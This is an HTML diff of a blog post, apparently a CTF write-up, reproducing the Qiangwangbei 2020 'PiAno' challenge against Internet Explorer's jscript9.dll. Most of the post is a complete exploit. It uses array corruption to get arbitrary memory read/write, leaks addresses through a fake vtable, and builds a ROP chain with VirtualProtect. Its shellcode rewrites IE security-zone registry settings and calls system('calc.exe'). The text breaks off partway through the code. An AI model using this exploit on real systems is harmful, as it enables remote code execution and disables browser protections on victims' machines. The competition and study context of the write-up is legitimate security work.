@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2021 | ruan</title>
+  <title>强网杯2020_RealWorld_PiAno复现 | ruan</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ruan">
-<meta property="og:url" content="http://yoursite.com/archives/2021/index.html">
+  <meta name="description" content="强网杯2020 Final的RealWorld题，PiAno复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2020_RealWorld_PiAno复现">
+<meta property="og:url" content="http://yoursite.com/2021/04/12/%E5%BC%BA%E7%BD%91%E6%9D%AF2020_RealWorld_PiAno%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="ruan">
+<meta property="og:description" content="强网杯2020 Final的RealWorld题，PiAno复现">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-04-12T03:34:11.000Z">
+<meta property="article:modified_time" content="2021-04-17T15:21:08.129Z">
 <meta property="article:author" content="ruan">
 <meta name="twitter:card" content="summary">
   
@@ -136,103 +140,176 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-强网杯2020_RealWorld_PiAno复现" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/12/v8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="archive-article-date">
-  	<time datetime="2021-04-12T09:21:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-12</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/12/v8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">v8 环境搭建</a>
+    <h1 class="article-title" itemprop="name">
+      强网杯2020_RealWorld_PiAno复现
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/12/%E5%BC%BA%E7%BD%91%E6%9D%AF2020_RealWorld_PiAno%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
+        
+        <a href="/2021/04/12/%E5%BC%BA%E7%BD%91%E6%9D%AF2020_RealWorld_PiAno%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
   	<time datetime="2021-04-12T03:34:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-12</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/12/%E5%BC%BA%E7%BD%91%E6%9D%AF2020_RealWorld_PiAno%E5%A4%8D%E7%8E%B0/">强网杯2020_RealWorld_PiAno复现</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>强网杯2020 Final的RealWorld题，PiAno复现</p>
+<p><escape><span id="more"></span></escape></p>
+<p>还是参考ha1vk师傅发在安全客上的文章复现成功的：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222678">https://www.anquanke.com/post/id/222678</a></p>
+<p>我主要记录下踩坑的地方</p>
+<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>题目文档说改动了jscript9.dll，为了下载和题目相同版本的dll，几经波折：</p>
+<ul>
+<li>下载并安装一个windows10虚拟机</li>
+<li>手动下载补丁更新到2004版本，在把更新给卸载掉，让它回退到比题目环境还低的版本，一个下载网站例子：<a target="_blank" rel="noopener" href="https://www.ithome.com/0/489/677.htm">https://www.ithome.com/0/489/677.htm</a></li>
+<li>接着直接google题目环境里dll的版本号，找到先对于的补丁号，直接下在手动进行更新</li>
+</ul>
+<p>比如本题目的dll版本是11.0.19041.508</p>
+<p>google搜索到后是KB4571756 - <em>11.0.19041.508</em>，直接去下载就行：<a target="_blank" rel="noopener" href="https://www.windowslatest.com/2020/09/08/windows-10-kb4571756/">https://www.windowslatest.com/2020/09/08/windows-10-kb4571756/</a></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>在执行命令（弹计算器前），要把IE的保护模式给关了，把<code>software\microsoft\windows\currentversion\internet settings\zones\3</code>里的<code>2500</code>zone给改成3，也就是禁止，详细解释见：</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/troubleshoot/browsers/ie-security-zones-registry-entries">https://docs.microsoft.com/en-us/troubleshoot/browsers/ie-security-zones-registry-entries</a></p>
+<p>就是ha1vk师傅文章中的exp：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> vuln = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>];</span></span><br><span class="line"><span class="javascript">		<span class="comment">//修改自身的size，实现任意地址读写</span></span></span><br><span class="line">		vuln[0x3ffffffe] = -1;</span><br><span class="line">		vuln[0x3ffffffd] = -1;</span><br><span class="line">		vuln[0x3ffffff6] = -1;</span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> vtable_addr = vuln[<span class="number">0x3ffffff2</span>];</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> jscript9_base = vtable_addr - <span class="number">0x37e8</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> LoadLibraryExA_ptr = jscript9_base + <span class="number">0x37600C</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> GetProcAddress_ptr = jscript9_base + <span class="number">0x3761A8</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> VirtualProtect_ptr = jscript9_base + <span class="number">0x376110</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> RtlCaptureContext_ptr = jscript9_base + <span class="number">0x376488</span>;</span></span><br><span class="line"><span class="javascript">		<span class="comment">// mov esp, ebx; pop ebx; retn 20h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// add esp, 14; ret</span></span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> pop_esp = jscript9_base + <span class="number">0x774ff</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> mov_esp_ebx = jscript9_base + <span class="number">0x23721a</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> add_esp = jscript9_base + <span class="number">0x270d5c</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> base = vuln[<span class="number">0x3ffffff8</span>] + <span class="number">0x10</span>;	 <span class="comment">// elements addr</span></span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">arb_read</span>(<span class="params">addr</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> offset = addr - base;</span></span><br><span class="line">			if (offset &lt; 0) &#123;</span><br><span class="line">				offset = (0x100000000 + offset) / 4;</span><br><span class="line"><span class="javascript">			&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">				offset = offset / 4;</span><br><span class="line">			&#125;</span><br><span class="line"><span class="javascript">			<span class="keyword">return</span> vuln[offset];</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">packInt</span>(<span class="params">value</span>) </span>&#123;</span></span><br><span class="line">			if (value &gt; 0x80000000) &#123;</span><br><span class="line">				value = value - 0x100000000;</span><br><span class="line">			&#125;</span><br><span class="line"><span class="javascript">			<span class="keyword">return</span> value;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="comment">//alert(&quot;elements at &quot; + base.toString(16));</span></span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> LoadLibraryExA_addr = arb_read(LoadLibraryExA_ptr);</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> GetProcAddress_addr = arb_read(GetProcAddress_ptr);</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> VirtualProtect_addr = arb_read(VirtualProtect_ptr);</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> RtlCaptureContext_addr = arb_read(RtlCaptureContext_ptr);</span></span><br><span class="line"><span class="javascript">		<span class="comment">//伪造该对象的虚表，从而leak出寄存器地址</span></span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> leak = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>];</span></span><br><span class="line">		leak[0x3ffffffe] = -1;</span><br><span class="line">		leak[0x3ffffffd] = -1;</span><br><span class="line">		leak[0x3ffffff6] = -1;</span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> fake_vtable_addr = leak[<span class="number">0x3ffffff8</span>] + <span class="number">0x10</span>;</span></span><br><span class="line"><span class="javascript">		leak[<span class="number">31</span>] = packInt(RtlCaptureContext_addr); <span class="comment">//伪造hasItem函数指针</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">//修改leak的虚表指针</span></span></span><br><span class="line">		leak[0x3ffffff2] = fake_vtable_addr;</span><br><span class="line"><span class="javascript">		<span class="comment">//alert(&quot;debug&quot;);</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">//调用hasItem，结果存放于base地址处</span></span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> x = (base <span class="keyword">in</span> leak);</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> stack_addr = arb_read(base + <span class="number">0xB4</span>);</span></span><br><span class="line"><span class="javascript">		<span class="comment">//劫持JavascriptArray::EntryPush函数的返回地址</span></span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> rop_addr = stack_addr - <span class="number">0x190</span>;</span></span><br><span class="line">		</span><br><span class="line">		vuln[0] = 0x54464F53;</span><br><span class="line">		vuln[1] = 0x45524157;</span><br><span class="line">		vuln[2] = 0x63694D5C;</span><br><span class="line">		vuln[3] = 0x6F736F72;</span><br><span class="line">		vuln[4] = 0x575C7466;</span><br><span class="line">		vuln[5] = 0x6F646E69;</span><br><span class="line">		vuln[6] = 0x435C7377;</span><br><span class="line">		vuln[7] = 0x65727275;</span><br><span class="line">		vuln[8] = 0x6556746E;</span><br><span class="line">		vuln[9] = 0x6F697372;</span><br><span class="line">		vuln[10] = 0x6E495C6E;</span><br><span class="line">		vuln[11] = 0x6E726574;</span><br><span class="line">		vuln[12] = 0x53207465;</span><br><span class="line">		vuln[13] = 0x69747465;</span><br><span class="line">		vuln[14] = 0x5C73676E;</span><br><span class="line">		vuln[15] = 0x656E6F5A;</span><br><span class="line">		vuln[16] = 0x335C73;</span><br><span class="line"><span class="javascript">		<span class="comment">/*ADVAPI32.dll字符串*/</span></span></span><br><span class="line">		vuln[17] = 0x41564441;</span><br><span class="line">		vuln[18] = 0x32334950;</span><br><span class="line">		vuln[19] = 0x6C6C642E;</span><br><span class="line">		vuln[20] = 0;</span><br><span class="line">	</span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> buff = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>];</span></span><br><span class="line"><span class="javascript">		<span class="comment">/*ucrtbase.dll字符串*/</span></span></span><br><span class="line">		buff[0] = 0x74726375;</span><br><span class="line">		buff[1] = 0x65736162;</span><br><span class="line">		buff[2] = 0x6C6C642E;</span><br><span class="line">		buff[3] = 0;</span><br><span class="line"><span class="javascript">		<span class="comment">/*RegOpenKeyExA字符串*/</span></span></span><br><span class="line">		buff[4] = 0x4F676552;</span><br><span class="line">		buff[5] = 0x4B6E6570;</span><br><span class="line">		buff[6] = 0x78457965;</span><br><span class="line">		buff[7] = 0x41;</span><br><span class="line"><span class="javascript">		<span class="comment">/*RegSetValueExA字符串*/</span></span></span><br><span class="line">		buff[8] = 0x53676552;</span><br><span class="line">		buff[9] = 0x61567465;</span><br><span class="line">		buff[10] = 0x4565756C;</span><br><span class="line">		buff[11] = 0x4178;</span><br><span class="line"><span class="javascript">		<span class="comment">/*RegCloseKey字符串*/</span></span></span><br><span class="line">		buff[12] = 0x43676552;</span><br><span class="line">		buff[13] = 0x65736F6C;</span><br><span class="line">		buff[14] = 0x79654B;</span><br><span class="line"><span class="javascript">		<span class="comment">/*system字符串*/</span></span></span><br><span class="line">		buff[15] = 0x74737973;</span><br><span class="line">		buff[16] = 0x6D65;</span><br><span class="line">	</span><br><span class="line"><span class="javascript">		<span class="comment">/*calc.exe字符串*/</span></span></span><br><span class="line">		buff[17] = 0x636C6163;</span><br><span class="line">		buff[18] = 0x6578652E;</span><br><span class="line">		buff[19] = 0;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		buff[0x3ffffffe] = -1;</span><br><span class="line">		buff[0x3ffffffd] = -1;</span><br><span class="line">		buff[0x3ffffff6] = -1;</span><br><span class="line">		</span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> strs_base = buff[<span class="number">0x3ffffff8</span>] + <span class="number">0x10</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">		<span class="comment">//修改vuln的index，然后利用push可以一次性写入多个值</span></span></span><br><span class="line">		vuln[0x3ffffff6] = (rop_addr - base) / 4;</span><br><span class="line">		vuln[0x3ffffffd] = (rop_addr - base) / 4;</span><br><span class="line"><span class="javascript">		alert(<span class="string">&quot;rop_addr=&quot;</span>+rop_addr.toString(<span class="string">&quot;16&quot;</span>));</span></span><br><span class="line"><span class="javascript">		<span class="comment">//VirtualProtect(</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">//LPVOID lpAddress, // 目标地址起始位置</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">//DWORD dwSize, // 大小</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">//DWORD flNewProtect, // 请求的保护方式</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">//PDWORD lpflOldProtect // 保存老的保护方式</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">//);</span></span></span><br><span class="line">		vuln.push(packInt(VirtualProtect_addr),</span><br><span class="line">		packInt(rop_addr+0x18),</span><br><span class="line">		packInt(rop_addr+0x18),</span><br><span class="line">		0x300,</span><br><span class="line">		0x40,</span><br><span class="line">		packInt(rop_addr),</span><br><span class="line">                  </span><br><span class="line"><span class="javascript">		<span class="comment">// 55              push    ebp</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 89e5            mov     ebp,esp</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 81ec00010000    sub     esp,100h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// c745fc03000000  mov     dword ptr [ebp-4],3</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// c78550ffffff32353030 mov dword ptr [ebp-0B0h],30303532h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// c78554ffffff00000000 mov dword ptr [ebp-0ACh],0</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 6800080000      push    800h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 6a00            push    0</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 687c009c0b      push    0B9C007Ch</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// c7854cffffff80150476 mov dword ptr [ebp-0B4h],offset KERNEL32!LoadLibraryExAStub (76041580)</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// ff954cffffff    call    dword ptr [ebp-0B4h]</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 898548ffffff    mov     dword ptr [ebp-0B8h],eax</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 90              nop</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		packInt(0x81e58955),</span><br><span class="line">		0x100ec,</span><br><span class="line">		packInt(0xfc45c700),</span><br><span class="line">		0x3,</span><br><span class="line">		packInt(0xff5085c7),</span><br><span class="line">		0x3532ffff,</span><br><span class="line">		packInt(0x85c73030),</span><br><span class="line">		packInt(0xffffff54),</span><br><span class="line">		0x0,</span><br><span class="line">		0x80068,</span><br><span class="line">		0x68006a00,</span><br><span class="line">		packInt(base+0x44),</span><br><span class="line">		packInt(0x85c79090),</span><br><span class="line">		packInt(0xffffff4c),</span><br><span class="line">		packInt(LoadLibraryExA_addr),</span><br><span class="line">		packInt(0xff4c95ff),</span><br><span class="line">		packInt(0x8589ffff),</span><br><span class="line">		packInt(0xffffff48),</span><br><span class="line">                  </span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc587 6888019c0b      push    0B9C0188h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc58c 50              push    eax</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc58d 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc58e c78544ffffff80445f6b mov dword ptr [ebp-0BCh],offset IEShims!NS_GetProcAddressShim::APIHook_GetProcAddress (6b5f4480)</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc598 ff9544ffffff    call    dword ptr [ebp-0BCh]</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc59e 898540ffffff    mov     dword ptr [ebp-0C0h],eax</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5a4 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5a5 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5a6 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5a7 6898019c0b      push    0B9C0198h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5ac ffb548ffffff    push    dword ptr [ebp-0B8h]</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5b2 ff9544ffffff    call    dword ptr [ebp-0BCh] ss:002b:05edc47c=&#123;IEShims!NS_GetProcAddressShim::APIHook_GetProcAddress (6b5f4480)&#125;</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5b8 89853cffffff    mov     dword ptr [ebp-0C4h],eax</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5be 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5bf 68a8019c0b      push    0B9C01A8h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5c4 ffb548ffffff    push    dword ptr [ebp-0B8h]</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5ca ff9544ffffff    call    dword ptr [ebp-0BCh] ss:002b:05edc47c=&#123;IEShims!NS_GetProcAddressShim::APIHook_GetProcAddress (6b5f4480)&#125;</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5d0 898538ffffff    mov     dword ptr [ebp-0C8h],eax</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5d6 8d8534ffffff    lea     eax,[ebp-0CCh]</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5dc 50              push    eax</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5dd 6806000200      push    20006h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5e2 6a00            push    0</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5e4 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5e5 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5e6 90              nop</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5e7 6838009c0b      push    0B9C0038h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5ec 6801000080      push    80000001h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5f1 ff9540ffffff    call    dword ptr [ebp-0C0h] ss:002b:05edc478=&#123;ADVAPI32!RegOpenKeyExAStub (776fe100)&#125;</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5f7 6a04            push    4</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5f9 8d45fc          lea     eax,[ebp-4]</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5fc 50              push    eax</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5fd 6a04            push    4</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc5ff 6a00            push    0</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc601 8d8550ffffff    lea     eax,[ebp-0B0h]</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc607 50              push    eax</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc608 ffb534ffffff    push    dword ptr [ebp-0CCh]</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc60e ff953cffffff    call    dword ptr [ebp-0C4h] ss:002b:05edc474=&#123;ADVAPI32!RegSetValueExAStub (776ff300)&#125;</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc614 ffb534ffffff    push    dword ptr [ebp-0CCh]</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc61a ff9538ffffff    call    dword ptr [ebp-0C8h] ss:002b:05edc470=&#123;ADVAPI32!RegCloseKeyStub (776fe010)&#125;</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc620 6800080000      push    800h</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc625 6a00            push    0</span></span></span><br><span class="line"><span class="javascript">		<span class="comment">// 05edc627 6878019c0b      push    0B9C0178h</span></span></span><br><span class="line"><span class="javascript">		<span 